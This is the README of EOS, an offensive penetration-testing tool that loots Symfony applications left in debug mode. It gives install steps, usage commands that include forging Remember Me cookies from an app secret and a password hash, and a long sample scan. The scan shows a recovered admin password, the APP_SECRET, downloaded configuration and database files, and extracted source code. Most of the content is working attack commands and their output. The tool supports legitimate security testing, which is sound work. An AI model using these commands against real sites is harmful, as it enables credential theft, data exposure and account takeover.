# Enemies Of Symfony (EOS)

`EOS` loots information from a Symfony target in debug mode:

| Section       | Description                                                                 |
| ------------- | --------------------------------------------------------------------------- |
| General       | Get general information about the target.                                   |
| Phpinfo       | Extract Symfony environment variables from the exposed phpinfo().           |
| Routes        | Get the list of registered routes.                                          |
| Request logs  | Look for credentials in POST request logs.                                  |
| Project files | Retrieve project files (configuration, database, etc.) based on a wordlist. |
| Sources       | Extract the application source code.                                        |
| Cookies       | Craft Remember Me cookies.                                                  |

More info at https://www.synacktiv.com/posts/pentest/looting-symfony-with-eos.html.

## Installation

### Standard

```bash
$ git clone https://github.com/Synacktiv/eos
$ python3 -m pip install --user ./eos
```

### Docker

```bash
$ git clone https://github.com/Synacktiv/eos
$ cd eos
$ docker build . -f eos.Dockerfile -t eos
```

## Usage

```bash
usage: eos [-h] [-V] [-v] [--no-colors] {scan,sources,get,creds,cookies} ...

  ███████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██╔════╝
  █████╗  ██║   ██║███████╗
  ██╔══╝  ██║   ██║╚════██║
  ███████╗╚██████╔╝███████║  Enemies Of Symfony
  ╚══════╝ ╚═════╝ ╚══════╝  v1.0.0

positional arguments:
  {scan,sources,get,creds,cookies}
    scan                 perform a full scan
    sources              download application source code
    get                  download a file from the application
    creds                extract credentials from request logs
    cookies              craft remember me cookies with a great lifetime

optional arguments:
  -h, --help             show this help message and exit
  -V, --version          display version info
  -v, --verbose          increase verbosity
  --no-colors            disable colors in output

examples:
  eos scan http://localhost
  eos scan -v -t 4 http://localhost
  eos scan --headers 'Cookie: foo=bar; john=doe' 'User-Agent: EOS' -- http://localhost
  eos get http://localhost config/services.yaml
  eos cookies -u jane_admin -H '$2y$13$IMalnQpo7xfZD5FJGbEadOcqyj2mi/NQbQiI8v2wBXfjZ4nwshJlG' -s 67d829bf61dc5f87a73fd814e2c9f629
```

```bash
$ eos scan http://localhost --output results
[+] Starting scan on http://localhost
[+] 2020-04-23 14:21:26.463352 is a great day

[+] Checks
[!] Target found in debug mode

[+] Info
[!]   Symfony 5.0.1
[!]   PHP 7.3.11-1~deb10u1
[!]   Environment: dev

[+] Request logs
[+] Found 9 POST requests
[!] Found the following credentials with a valid session:
[!]   jane_admin: kitten [ROLE_ADMIN]

[+] Phpinfo
[+] Available at http://localhost/_profiler/phpinfo
[+] Found 101 PHP variables
[!] Found the following Symfony variables:
[!]   APP_ENV: dev
[!]   APP_SECRET: 67d829bf61dc5f87a73fd814e2c9f629
[!]   DATABASE_URL: sqlite:///%kernel.project_dir%/data/database.sqlite
[!]   MAILER_URL: null://localhost

[+] Project files
[+] Found: composer.lock, run 'symfony security:check' or submit it at https://security.symfony.com
[!] Found the following files:
[!]   composer.lock
[!]   composer.json
[!]   config/bundles.php
[!]   config/bootstrap.php
[!]   config/packages/assets.yaml
[!]   config/packages/cache.yaml
[!]   config/packages/dev/debug.yaml
[!]   config/packages/dev/monolog.yaml
[!]   config/packages/dev/routing.yaml
[!]   config/packages/dev/swiftmailer.yaml
[!]   config/packages/dev/web_profiler.yaml
[!]   config/packages/doctrine_migrations.yaml
[!]   config/packages/doctrine.yaml
[!]   config/packages/framework.yaml
[!]   config/packages/html_sanitizer.yaml
[!]   config/packages/prod/doctrine.yaml
[!]   config/packages/prod/monolog.yaml
[!]   config/packages/prod/routing.yaml
[!]   config/packages/prod/webpack_encore.yaml
[!]   config/packages/routing.yaml
[!]   config/packages/security.yaml
[!]   config/packages/sensio_framework_extra.yaml
[!]   config/packages/swiftmailer.yaml
[!]   config/packages/test/dama_doctrine_test_bundle.yaml
[!]   config/packages/test/framework.yaml
[!]   config/packages/test/monolog.yaml
[!]   config/packages/test/routing.yaml
[!]   config/packages/test/security.yaml
[!]   config/packages/test/swiftmailer.yaml
[!]   config/packages/test/twig.yaml
[!]   config/packages/test/validator.yaml
[!]   config/packages/test/webpack_encore.yaml
[!]   config/packages/test/web_profiler.yaml
[!]   config/packages/translation.yaml
[!]   config/packages/twig.yaml
[!]   config/packages/validator.yaml
[!]   config/packages/webpack_encore.yaml
[!]   config/routes/annotations.yaml
[!]   config/routes/dev/framework.yaml
[!]   config/routes/dev/web_profiler.yaml
[!]   config/routes.yaml
[!]   config/services.yaml
[!]   data/database.sqlite
[!]   data/database_test.sqlite
[!]   package.json
[!]   public/index.php
[!]   public/robots.txt
[!]   README.md
[!]   src/Kernel.php
[!]   symfony.lock
[!]   var/cache/dev/url_generating_routes.php
[!]   var/cache/dev/url_matching_routes.php
[!]   var/log/dev.log

[+] Routes
[!] Found the following routes:
[!]   /{_locale}/admin/post/
[!]   /{_locale}/admin/post/
[!]   /{_locale}/admin/post/new
[!]   /{_locale}/admin/post/{id}
[!]   /{_locale}/admin/post/{id}/edit
[!]   /{_locale}/admin/post/{id}/delete
[!]   /{_locale}/blog/
[!]   /{_locale}/blog/rss.xml
[!]   /{_locale}/blog/page/{page}
[!]   /{_locale}/blog/posts/{slug}
[!]   /{_locale}/blog/comment/{postSlug}/new
[!]   /{_locale}/blog/search
[!]   /{_locale}/login
[!]   /{_locale}/logout
[!]   /{_locale}/profile/edit
[!]   /{_locale}/profile/change-password
[!]   /{_locale}

[+] Project sources
[!] Found the following source files:
[!]   src/Command/AddUserCommand.php
[!]   src/Command/DeleteUserCommand.php
[!]   src/Command/ListUsersCommand.php
[!]   src/Controller/Admin/BlogController.php
[!]   src/Controller/BlogController.php
[!]   src/Controller/SecurityController.php
[!]   src/Controller/UserController.php
[!]   src/DataFixtures/AppFixtures.php
[!]   src/Entity/Comment.php
[!]   src/Entity/Post.php
[!]   src/Entity/Tag.php
[!]   src/Entity/User.php
[!]   src/EventSubscriber/CheckRequirementsSubscriber.php
[!]   src/EventSubscriber/CommentNotificationSubscriber.php
[!]   src/EventSubscriber/ControllerSubscriber.php
[!]   src/EventSubscriber/RedirectToPreferredLocaleSubscriber.php
[!]   src/Events/CommentCreatedEvent.php
[!]   src/Form/CommentType.php
[!]   src/Form/DataTransformer/TagArrayToStringTransformer.php
[!]   src/Form/PostType.php
[!]   src/Form/Type/ChangePasswordType.php
[!]   src/Form/Type/DateTimePickerType.php
[!]   src/Form/Type/TagsInputType.php
[!]   src/Form/UserType.php
[!]   src/Kernel.php
[!]   src/Pagination/Paginator.php
[!]   src/Repository/PostRepository.php
[!]   src/Repository/TagRepository.php
[!]   src/Repository/UserRepository.php
[!]   src/Security/PostVoter.php
[!]   src/Twig/AppExtension.php
[!]   src/Twig/SourceCodeExtension.php
[!]   src/Utils/Markdown.php
[!]   src/Utils/MomentFormatConverter.php
[!]   src/Utils/Slugger.php
[!]   src/Utils/Validator.php

[+] Saving files to results
[+] Saved 88 files

[+] Generated tokens: 5894a5 f68efa
[+] Scan completed in 0:00:13
```

### Example usage with Docker

```bash
$ docker run --rm -v /tmp/eos:/tmp/res eos eos scan http://localhost/ --output /tmp/res
```
